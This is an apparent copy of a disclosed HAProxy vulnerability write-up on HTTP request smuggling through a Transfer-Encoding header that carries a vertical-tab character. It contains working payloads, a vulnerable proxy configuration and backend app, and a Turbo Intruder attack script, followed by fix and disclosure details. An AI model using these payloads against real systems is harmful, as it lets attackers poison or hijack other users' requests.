##
#
https://gist.github.com/ndavison/4c69a2c164b2125cd6685b7d5a3c135b
#
##

The following describes a technique to achieve HTTP request smuggling against infrastructure behind a HAProxy server when using specific configuration around backend connection reuse. This was tested against HAProxy versions 1.7.9, 1.7.11, 1.8.19, 1.8.21, 1.9.10, and 2.0.5. Of all these tested versions, only 2.0.5 was not vulnerable out of the box, although it is when using the `no option http-use-htx` configuration, which reverts back to the legacy HTTP decoder. 2.1 removed the legacy decoder so it is not affected.

To actually exploit HTTP smuggling using the issue described in this writeup, the backend server(s) behind HAProxy would  also have to be vulnerable in the sense they too would need to suffer from a bug, but one which parses and accepts a poorly formed Transfer-Encoding header (almost certainly violating RFC7230), and allows HTTP keep-alive.

## The HAProxy bug - sending both Transfer-Encoding and Content-Length

This is how HAProxy handles a request when Transfer-Encoding and Content-Length is provided together:

**Request to HAProxy:**
```http
POST / HTTP/1.1
Host: 127.0.0.1:1080
Content-Length: 6
Transfer-Encoding: chunked

0

X
```

**Request forwarded to backend:**
```http
POST / HTTP/1.1
Host: 127.0.0.1:1080
Transfer-Encoding: chunked
X-Forwarded-For: 172.21.0.1

0

```

The request HAProxy sends to the backend has correctly prioritized Transfer-Encoding, and has stripped out the content length and cut off the "X" from the request, which went outside the boundry of the Transfer-Encoding request.

However, in the next request we have a `\x0b` (vertical tab) before the "chunked" string (note: `\x0c` aka form feed also works).

**Request to HAProxy:**
```http
POST / HTTP/1.1
Host: 127.0.0.1:1080
Content-Length: 6
Transfer-Encoding:[\x0b]chunked

0

X
```

**Request forwarded to backend:**
```http
POST / HTTP/1.1
Host: 127.0.0.1:1080
Content-Length: 6
Transfer-Encoding:
                  chunked
X-Forwarded-For: 172.21.0.1

0

X
```

In this case, the Transfer-Encoding is not detected by HAProxy, and so the Content-Length is used (and as such, the `X` is forwarded because it falls within the 6 bytes of body size specified). However, because the Transfer-Encoding remains in the request sent to the backend, it means that if a backend server manages to parse the Transfer-Encoding header and proceeds to treat the request as a TE encoded request, a desync could occur and the backend TCP socket could be poisoned (in this case, with an "X"). This could then lead to HTTP request smuggling. A way to test whether this might be the case on an app behind HAProxy would be to issue a request like as outlined in the [HTTP Request Smuggling Reborn](https://portswigger.net/blog/http-desync-attacks-request-smuggling-reborn) research:

```http
POST / HTTP/1.1
Host: 127.0.0.1:1080
Content-Length: 4
Transfer-Encoding:chunked

1
Z
Q
```

Because it uses the Content-Length, HAProxy will forward the following to the backend:

```http
POST / HTTP/1.1
Host: 127.0.0.1:1080
Content-Length: 4
Transfer-Encoding:
                  chunked
X-Forwarded-For: 172.21.0.1

1
Z
```

If the backend parses this request using Transfer-Encoding, then it will timeout waiting for the terminating '0\r\n\r\n'. The aforementioned research classifies it as "CL.TE" desync.

## Request smuggling proof of concept

Now we have HAProxy sending through both Content-Length and Transfer-Encoding with potentially conflicting information, we can try to achieve request smuggling. This can be demonstrated using the following setup.

### HAProxy config

Use this `haproxy.cfg`:

```
defaults
	mode http
  	timeout http-keep-alive 10s
	timeout connect 5s
	timeout server 60s
	timeout client 30s
	timeout http-request 30s

backend web
	http-reuse always
	server web0 host.docker.internal:6767

frontend http
	bind *:1080
	timeout client 5s
	timeout http-request 10s
  	default_backend web
```

You may need to change `host.docker.internal` to point to the actual backend app (code below), as this currently assumes HAProxy is running in a docker container and the docker host is running the backend server.

The real key here is `http-reuse always`, which is not the default option for handling connection reuse in HAProxy. See more detail about this setting here: [http://cbonte.github.io/haproxy-dconv/1.9/configuration.html#4.2-http-reuse](http://cbonte.github.io/haproxy-dconv/1.9/configuration.html#4.2-http-reuse). This is essential to achieve request smuggling, as we want our victim connections from HAProxy to the backend server to reuse our attacker controlled connection.

### The backend

For the backend, we need a HTTP server which will go along with the HAProxy keep-alives, and which will parse the malformed Transfer-Encoding header as valid, and also prioritize the Transfer-Encoding over Content-Length. This could describe many backend servers, but one I've found is the Python gunicorn app server (tested against the current latest 19.9.0) when combined with any of the workers except sync (doesn't support keep-alive) and tornado. Below I have a demo web app using Flask that should be vulnerable to request smuggling when combined with the HAProxy bug. First let's install the prereqs:

```bash
pip install flask
pip install gunicorn
pip install gunicorn[gevent]
```

And the app `backend.py`:

```python
from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def main():
    # the next line is required for Transfer-Encoding support in the request
    request.environ['wsgi.input_terminated'] = True
    headers = {}
    for header in request.headers:
        headers[header[0]] = header[1]
    return jsonify(body=request.data, headers=headers)
```

gunicorn is used to serve the application, and we need to specify a non default worker to enable keep-alive:

```bash
gunicorn --keep-alive 10 -k gevent --bind 0.0.0.0:6767 -w 4 backend:app
```

Now with HAProxy running the above config and our backend server running, we should be able to test it for smuggling. The best way to do this from my experience is using Burp Suite's Turbo Intruder extension with the following script:

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint='http://127.0.0.1:1080',
                           concurrentConnections=1,
                           requestsPerConnection=1,
                           pipeline=False,
                           maxRetriesPerRequest=0
                           )

    attack = '''POST / HTTP/1.1
Host: 127.0.0.1:1080
Content-Length: 37
Connection: keep-alive
Transfer-Encoding:chunked

1
A
0

GET / HTTP/1.1
X-Foo: bar'''
    engine.queue(attack)
    engine.start()


def handleResponse(req, interesting):
    table.add(req)
    if req.code == 200:
        victim = '''GET / HTTP/1.1
Host: 127.0.0.1:1080
Connection: close

'''

        for i in range(10):
            req.engine.queue(victim)
```

Note the `concurrentConnections=1` and `requestsPerConnection=1` configuration in this script - this should avoid encountering false positives, where we are poisoning our client to HAProxy connection instead of HAProxy to backend. You may need to change the endpoint and Host headers to suit your environment.

How do we know we have achieved smuggling? when we launch this attack in Turbo Intruder, one of the victim results (likely the first) should stand out response size wise. Going back to the above app code, we are echoing out the request headers in the response. Here is what the response for the poisoned victim request looks like:

```json
{"body":"","headers":{"Host":"127.0.0.1:1080","X-Foo":"barGET / HTTP/1.1"}}
```

We can see here that the `X-Foo: bar` header in the attacker request is present in a victim request's headers, and the `GET / HTTP/1.1` that the victim really wanted to request has been appended to this. This is a smuggled header, achieving HTTP request smuggling.

## Fix

The HAProxy bug which allows the malformed Transfer-Encoding header through was [fixed in 2.0.6](http://git.haproxy.org/?p=haproxy-2.0.git;a=commit;h=196a7df44d8129d1adc795da020b722614d6a581) for those on 2.0.x who need the `no option http-use-htx` config. In 1.9, you should be able to use `option http-use-htx` to switch to the new HTTP decoder which is enabled by default in 2.0, which is not vulnerable to this bug. For those on 1.9 who need to use the legacy decoder or on earlier versions, the [commit message](http://git.haproxy.org/?p=haproxy-2.0.git;a=commit;h=196a7df44d8129d1adc795da020b722614d6a581) suggests it will be back ported to all maintained versions (which appears to be 1.6 and above at the time or writing).

## Reporting timeline

* Reported the malformed Transfer-Encoding bug to HAProxy maintainers on September 7th 2019.
* Fixed in [HAProxy 2.0.6 on September 13th 2019](https://www.mail-archive.com/haproxy@formilux.org/msg34926.html)

## Thanks

A big thanks to [James Kettle](https://twitter.com/albinowax) for the advice, and particularly for the tip on the Turbo Intruder script and needing `requestsPerConnection=1` to avoid false positives with smuggling. Also, thanks to the HAProxy maintainers for their responsiveness and advice to help further understand the issue.
